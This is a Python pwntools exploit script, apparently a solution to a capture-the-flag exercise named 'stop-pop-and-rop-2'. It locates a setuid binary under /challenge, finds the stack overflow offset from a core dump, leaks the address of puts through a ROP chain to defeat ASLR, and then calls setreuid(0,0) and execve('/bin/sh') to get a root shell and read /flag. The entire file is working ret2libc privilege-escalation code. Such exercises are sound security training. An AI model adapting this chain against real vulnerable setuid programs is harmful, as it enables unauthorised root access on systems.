import shutil
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def find_offset():
    bin = find_challenge()
    tmp = f"/tmp/{bin.lstrip('/challenge/')}"
    shutil.copy2(bin, tmp)
    io = pwn.process(tmp, level="error")
    io.sendline(pwn.cyclic(256))
    io.wait()
    core = io.corefile
    fault_val = core.read(core.rsp, 4)
    offset = pwn.cyclic_find(fault_val)
    return offset


# stop-pop-and-rop-2
bin = find_challenge()
elf = pwn.ELF(bin, checksec=False)

io = tee(pwn.process(bin))
padding = find_offset()

rop = pwn.ROP(elf)
rop.raw(rop.generatePadding(0, padding))
rop.call("puts", [elf.got["puts"]])
rop.call(elf.symbols["challenge"])

io.sendline(rop.chain())
io.recvuntil(b"Leaving!\n")
leak_puts_addr = pwn.u64(io.recv(6).ljust(8, b"\0"))

assert elf.libc
libc = elf.libc
libc.address = leak_puts_addr - libc.symbols["puts"]

rop = pwn.ROP(libc)
rop.raw(rop.generatePadding(0, padding))
rop.call("setreuid", [0, 0])
rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])
io.sendline(rop.chain())
io.sendline(b"cat /flag; exit")

io.recvrepeat()
